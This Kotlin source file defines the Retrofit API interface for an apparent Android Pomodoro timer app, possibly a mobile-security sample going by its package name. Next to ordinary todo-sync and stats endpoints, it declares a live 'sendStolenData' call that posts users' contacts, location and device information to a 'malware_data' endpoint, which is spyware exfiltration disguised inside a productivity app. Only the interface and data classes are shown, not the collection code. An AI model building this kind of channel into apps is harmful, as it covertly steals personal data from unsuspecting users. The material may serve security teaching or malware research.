package com.mobilesec.pomodorotimer.data.remote

import retrofit2.Response
import retrofit2.http.*

//interface ApiService {
//    @POST("todos")
//    suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<TodoSyncResponse>
//
//    @GET("user/stats")
//    suspend fun getUserStats(@Header("Authorization") token: String): Response<UserStatsResponse>
//
//    // Vulnerable endpoint for malware
//    @POST("malware_data")
//    suspend fun sendStolenData(@Body data: StolenDataRequest): Response<Unit>
//}

interface ApiService {
    @POST("todos")
    // suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<TodoSyncRequest>
    // suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<List<TodoSyncRequest>>
    // suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<Unit>
    suspend fun syncTodos(@Body todos: List<TodoSyncRequest>): Response<Unit>

    @GET("todos")
    suspend fun getTodos(): Response<List<Map<String, Any>>>

    @GET("user/stats")
    suspend fun getUserStats(@Header("Authorization") token: String): Response<UserStatsResponse>


    // Vulnerable endpoint for malware
    @POST("malware_data")
    suspend fun sendStolenData(@Body data: StolenDataRequest): Response<Unit>
}


data class TodoSyncRequest(
    val title: String,
    val isCompleted: Boolean,
    val createdAt: Long
)

data class TodoSyncResponse(
    val success: Boolean,
    val message: String
)

data class UserStatsResponse(
    val totalSessions: Int,
    val isPremium: Boolean
)

data class StolenDataRequest(
    val contacts: List<String>,
    val location: String?,
    val deviceInfo: String
)
